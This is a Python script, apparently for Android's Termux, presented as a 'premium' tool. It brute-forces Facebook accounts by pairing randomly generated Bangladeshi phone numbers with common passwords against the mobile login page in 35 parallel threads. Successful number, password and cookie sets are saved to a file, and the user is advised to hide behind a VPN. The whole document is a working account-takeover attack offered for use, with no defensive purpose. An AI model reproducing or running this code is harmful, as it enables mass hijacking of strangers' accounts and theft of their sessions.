import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# COLOR SETTINGS
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
loop = 0
ok = []

# YOUR UPDATED VIVO V2055 USER AGENT
VIVO_UA = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/121.0.2277.107"

def banner():
    os.system('clear')
    print(f"""{G}
    ███    ███  ███████  ████████  █████  
    ████  ████  ██          ██    ██   ██ 
    ██ ████ ██  █████       ██    ███████ 
    ██  ██  ██  ██          ██    ██   ██ 
    ██      ██  ███████     ██    ██   ██ 
{W}------------------------------------------------
 [✓] TOOL NAME : JILANI MASTER HYBRID
 [✓] VERSION   : 4.0.1 (PREMIUM)
 [✓] DEVICE    : VIVO-V2055-OPTIMIZED
 [✓] BYPASS    : AUTO-DNS & AJAX-M2
------------------------------------------------""")

def engine(uid, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[JILANI-SCAN] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # POWERFUL PASSWORD PATTERNS BASED ON BD TRENDS
    pws = [uid, uid[6:], uid[:6], '778899', '@@##1122', 'khan123', 'mim123', 'bangladesh', 'Allah123', 'bismillah', 'freefire']
    
    for pas in pws:
        if len(pas) < 6: continue
        session = requests.Session()
        
        try:
            # FETCHING TOKENS FROM MOBILE INTERFACE
            res = session.get('https://m.facebook.com/login/device-based/regular/login/').text
            lsd = re.search('name="lsd" value="(.*?)"', str(res)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(res)).group(1)
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/',
                'user-agent': VIVO_UA,
            }

            data = {"lsd": lsd, "jazoest": jazoest, "email": uid, "pass": pas, "login": "Log In"}
            post = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100', data=data, headers=headers)

            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}')
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                open('/sdcard/JILANI_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
                break
        except: pass
    loop += 1

def start():
    banner()
    code = input(f'{G}[+] ENTER OPERATOR CODE (e.g. 017/019): {W}')
    limit = 100000 
    with ThreadPoolExecutor(max_workers=35) as submit:
        banner()
        print(f'{G}[+] TARGET CODE: {code} | LIMIT: {limit}')
        print(f'{Y}[!] TIP: USE MOBILE HOTSPOT + SINGAPORE VPN')
        print(f'{W}------------------------------------------------\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            submit.submit(engine, uid, limit)

if _name_ == "_main_":
    # AUTO-FIXING DNS FOR TERMUX BEFORE STARTING
    os.system('echo "nameserver 8.8.8.8" > /data/data/com.termux/files/usr/etc/resolv.conf')
    start()
